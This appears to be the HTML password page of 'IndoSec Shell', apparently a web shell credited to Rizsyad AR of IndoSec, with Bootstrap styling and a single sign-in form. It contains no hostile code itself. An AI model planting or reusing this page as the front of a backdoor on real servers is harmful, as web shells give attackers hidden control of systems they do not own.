<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="author" content="Rizsyad AR" />
    <meta name="copyright" content="{ IndoSec }" />
    <link
      rel="apple-touch-icon"
      href="https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/assets/img/icon.png"
    />
    <link
      rel="shortcut icon"
      href="https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/assets/img/icon.png"
    />
    <title>{ IndoSec Shell }</title>
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
    />
    <link
      rel="stylesheet"
      href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"
    />
    <style>
      .divider:after,
      .divider:before {
        content: "";
        flex: 1;
        height: 1px;
        background: #eee;
      }
      body {
        background-color: rgba(31, 41, 55, 1);
        color: #fff;
      }
    </style>
  </head>
  <body>
    <section class="vh-100">
      <div class="container py-5 h-100">
        <div class="row d-flex align-items-center justify-content-center h-100">
          <div class="col-md-8 col-lg-7 col-xl-6">
            <img
              src="https://raw.githubusercontent.com/Rizsyad/IndoSec-ShEll/main/assets/img/icon.png"
              class="img-fluid rounded-circle"
              width="466px"
              height="355px"
              alt="Phone image"
            />
          </div>
          <div class="col-md-7 col-lg-5 col-xl-5 offset-xl-1">
            <form method="post">
              <!-- Password input -->
              <div class="form-outline mb-4">
                <label class="form-label" for="password">Password:</label>
                <input
                  type="password"
                  id="password"
                  name="pass"
                  class="form-control form-control-lg"
                />
              </div>

              <div
                class="d-flex justify-content-around align-items-center mb-4"
              ></div>

              <!-- Submit button -->
              <button type="submit" class="btn btn-primary btn-lg btn-block">
                Sign in
              </button>
            </form>
          </div>
        </div>
      </div>
    </section>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>
